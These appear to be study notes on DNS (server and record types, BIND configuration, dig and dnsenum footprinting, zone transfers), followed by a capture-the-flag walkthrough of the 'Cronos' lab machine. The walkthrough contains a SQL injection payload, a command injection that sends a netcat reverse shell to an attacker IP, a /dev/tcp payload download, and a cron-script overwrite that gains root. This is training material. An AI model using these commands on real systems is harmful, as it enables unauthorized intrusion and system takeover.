# Domain Name System

DNS translates domain names to ip address. It is exposed on port `53`

There are several DNS server types 

| **Server Type**                | **Description**                                                                                                                                                                                                                                                                                                                                                                                                                                                                          |
| ------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `DNS Root Server`              | The root servers of the DNS are responsible for the top-level domains (`TLD`). As the last instance, they are only requested if the name server does not respond. Thus, a root server is a central interface between users and content on the Internet, as it links domain and IP address. The [Internet Corporation for Assigned Names and Numbers](https://www.icann.org/) (`ICANN`) coordinates the work of the root name servers. There are `13` such root servers around the globe. |
| `Authoritative Nameserver`     | Authoritative name servers hold authority for a particular zone. They only answer queries from their area of responsibility, and their information is binding. If an authoritative name server cannot answer a client's query, the root name server takes over at that point. Based on the country, company, etc., authoritative nameservers provide answers to recursive DNS nameservers, assisting in finding the specific web server(s).                                              |
| `Non-authoritative Nameserver` | Non-authoritative name servers are not responsible for a particular DNS zone. Instead, they collect information on specific DNS zones themselves, which is done using recursive or iterative DNS querying.                                                                                                                                                                                                                                                                               |
| `Caching DNS Server`           | Caching DNS servers cache information from other name servers for a specified period. The authoritative name server determines the duration of this storage.                                                                                                                                                                                                                                                                                                                             |
| `Forwarding Server`            | Forwarding servers perform only one function: they forward DNS queries to another DNS server.                                                                                                                                                                                                                                                                                                                                                                                            |
| `Resolver`                     | Resolvers are not authoritative DNS servers but perform name resolution locally in the computer or router.                                                                                                                                                                                                                                                                                                                                                                               |

DNS Record types

| **DNS Record** | **Description**                                                                                                                                                                                                                                                                               |
| -------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `A`            | Returns an IPv4 address of the requested domain as a result.                                                                                                                                                                                                                                  |
| `AAAA`         | Returns an IPv6 address of the requested domain.                                                                                                                                                                                                                                              |
| `MX`           | Returns the responsible mail servers as a result.                                                                                                                                                                                                                                             |
| `NS`           | Returns the DNS servers (nameservers) of the domain.                                                                                                                                                                                                                                          |
| `TXT`          | This record can contain various information. The all-rounder can be used, e.g., to validate the Google Search Console or validate SSL certificates. In addition, SPF and DMARC entries are set to validate mail traffic and protect it from spam.                                             |
| `CNAME`        | This record serves as an alias for another domain name. If you want the domain [www.hackthebox.eu](http://www.hackthebox.eu/) to point to the same IP as hackthebox.eu, you would create an A record for hackthebox.eu and a CNAME record for [www.hackthebox.eu](http://www.hackthebox.eu/). |
| `PTR`          | The PTR record works the other way around (reverse lookup). It converts IP addresses into valid domain names.                                                                                                                                                                                 |
| `SOA`          | Provides information about the corresponding DNS zone and email address of the administrative contact.                                                                                                                                                                                        |

The `SOA` record is located in a domain's zone file and specifies who is responsible for the operation of the domain and how DNS information for the domain is managed.

get tools 

```bash
sudo pacman -Sy bind --noconfirm 
```

DNS server `Bind9` for linux 

- `named.conf.local`
- `named.conf.options`
- `named.conf.log`

```bash
cat /etc/bind/named.conf.local
```

It contains the associated RFC where we can customize the server to our needs and our domain structure with the individual zones for different domains. The configuration file `named.conf` is divided into several options that control the behavior of the name server. A distinction is made between `global options` and `zone options`

An RFC is a document that defines how internet protocols, standards, and best practices work.

In this file zones can be defined in individual files . A `zone file` is a text file that describes a DNS zone with the BIND file format, a point of delagation in the DNS tree. It defines a zone completely 

There must be precisely one `SOA` record and at least one `NS` record. The SOA resource record is usually located at the beginning of a zone file. The main goal of these global rules is to improve the readability of zone files

all `forward records` are entered according to the BIND format. This allows the DNS server to identify which domain, hostname, and role the IP addresses belong to. In simple terms, this is the phone book where the DNS server looks up the addresses for the domains it is searching for.

cat a zone file 

```bash
 cat /etc/bind/db.domain.com
```

For the `Fully Qualified Domain Name` (`FQDN`) to be resolved from the IP address, the DNS server must have a reverse lookup file. In this file, the computer name (`FQDN`) is assigned to the last octet of an IP address, which corresponds to the respective host, using a PTR record. The PTR records are responsible for the reverse translation of IP addresses into names, as we have already seen in the above table.

Dangerous settings

| **Option**        | **Description**                                                                |
| ----------------- | ------------------------------------------------------------------------------ |
| `allow-query`     | Defines which hosts are allowed to send requests to the DNS server.            |
| `allow-recursion` | Defines which hosts are allowed to send recursive requests to the DNS server.  |
| `allow-transfer`  | Defines which hosts are allowed to receive zone transfers from the DNS server. |
| `zone-statistics` | Collects statistical data of zones.                                            |

Footprinting the service

Name server query

| target domain | ip          |
| ------------- | ----------- |
| domain.com    | 10.10.10.10 |

```bash
dig ns domain.com @10.10.10.10
```

Version query 

```bash
dig CH TXT version.bind 10.10.10.10
```

Any query

```bash
dig any domain.com @10.10.10.10
```

`Zone transfer` refers to the transfer of zones to another server in DNS, which generally happens over TCP port 53. This procedure is abbreviated `Asynchronous Full Transfer Zone` (`AXFR`).

Synchronization between the servers involved is realized by zone transfer. Using a secret key `rndc-key`, which we have seen initially in the default configuration, the servers make sure that they communicate with their own master or slave. Zone transfer involves the mere transfer of files or records and the detection of discrepancies in the data sets of the servers involved.

Master vs Slave 

- A DNS server that serves as a direct source for synchronizing a zone file is called a `master`. 

- A DNS server that obtains zone data from a master is called a `slave`.

- A primary is always a master, while a secondary can be both a slave and a master.

The slave fetches the `SOA` record of the relevant zone from the master at certain intervals, the so-called refresh time, usually one hour, and compares the serial numbers. If the serial number of the SOA record of the master is greater than that of the slave, the data sets no longer match.

Zone transfer

```bash
dig axfr domain.com @10.10.10.10
```

dNSENUM TOOL

```bash
dnsenum --dnsserver <DNS_SERVER_IP> --enum -p 0 -s 0 -o subdomains.txt -f </path/to/list.txt> <subdomain>.inlanefreight.htb
```

Practice DNS enum 

## Cronos

#### Machine(vip)

#### Level: medium

do some recon 

```bash
rustscan -a cronos.htb  -- --min-rate 5000 -sCV
```

| open ports |      |
| ---------- | ---- |
| 80/tcp     | http |
| 53/tcp     | dns  |
| 22/tcp     | ssh  |

enumerate dns 

```bash
dnsenum --dnsserver 10.129.227.211 \
--enum -p 0 -s 0 -o output_cronos.txt \
-f ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt \ 
cronos.htb 
```

> Brute forcing with /home/clumzzy/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt:
> 
> ___________________________________________________________________________________________
> 
> www.cronos.htb.                          604800   IN    A        10.10.10.13
> ns1.cronos.htb.                          604800   IN    A        10.10.10.13
> admin.cronos.htb.                        604800   IN    A        10.10.10.13

add all to hosts 

login page @`admin.cronos.htb`

```bash
sqlmap -u "http://admin.cronos.htb/" \
--data="username=admin&password=admin+" \
--cookie="PHPSESSID=c00tr37guan0ifn8br3lb5qn26" --batch
```

> ---
> 
> Parameter: username (POST)
>     Type: time-based blind
>     Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
>     Payload: username=admin' AND (SELECT 7384 FROM (SELECT(SLEEP(5)))LdBH) AND 'JkFa'='JkFa&password=admin

That confirmed sqli, basic injection `admin'-- -` worked

On another terminal;

```bash
nc -lvnp 9002
```

Manipulate the command thingy 

```bash
 curl -k 'http://admin.cronos.htb/welcome.php' \
-H 'Content-Type: application/x-www-form-urlencoded' \
-b 'PHPSESSID=c00tr37guan0ifn8br3lb5qn26'\
--data-urlencode "command=ping -c 1" \
--data-urlencode "host=8.8.8.8;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.244 9002 >/tmp/f"
```

Stabilise the shell 

1. check for python3 and spawn new one 

```bash
which python3 
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

CTRL +Z 

```bash
stty raw -echo;fg
```

the cmd makes sure main shell dont interrupt with the rev shell

```bash
export TERM=xterm-256color 
```

run Lin Enum 

The LinEnum result shows that there is a PHP file that is being executed
as a cron job under user root  and its writable 

Overwrite with rev shell from here: [https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php]

host the revshell @`shell.php`

- chage ip to your tun0 ip and port to 9001

ON LOCAL MACHINE 

```bash
sudo nc -lnvp 80 < shell.php 
```

start a listener 

```bash
nc -lvnp 9001
```

get it on target 

```bash
cat < /dev/tcp/<tun0>/80 > /tmp/shell.php
```

overwrite the script

```bash
mv /tmp/shell.php /var/www/laravel/artisan
```

wait for cronjob to execute
